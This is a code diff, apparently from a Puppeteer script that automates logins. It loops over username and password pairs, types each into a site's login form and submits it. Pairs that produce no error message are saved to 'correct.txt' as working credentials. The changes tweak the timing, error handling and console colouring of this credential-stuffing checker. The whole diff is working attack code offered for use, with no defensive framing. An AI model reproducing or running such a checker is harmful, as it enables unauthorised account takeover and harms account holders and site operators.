@@ -15,18 +15,19 @@ async function process () {
           });
 
           const page = await browser.newPage();
-          page.waitForTimeout(2000)    
+          page.waitForTimeout(1000)    
 
-          await page.goto('https://example.com');         
+          await page.goto('https://example.com');   
+          try { 
           await page.type('[type="user"]', newline[0])          
           await page.type('[type="password"]', newline[1])          
           await page.click('[type="submit"]')
           await page.waitForTimeout(2000) 
 
-          try {           
+                    
            go =  await page.waitForSelector('[class="Error Message"]', {visible: true}); //or Error Code
            if (go) {
-             console.log("incorrect!!")
+             console.log('\x1b[31m', "incorrect!!")
            }
           } catch (error) {            
             fs.appendFile('correct.txt', `${newline[0]}, ${newline[1]}, '\n\r'`, function (err) {
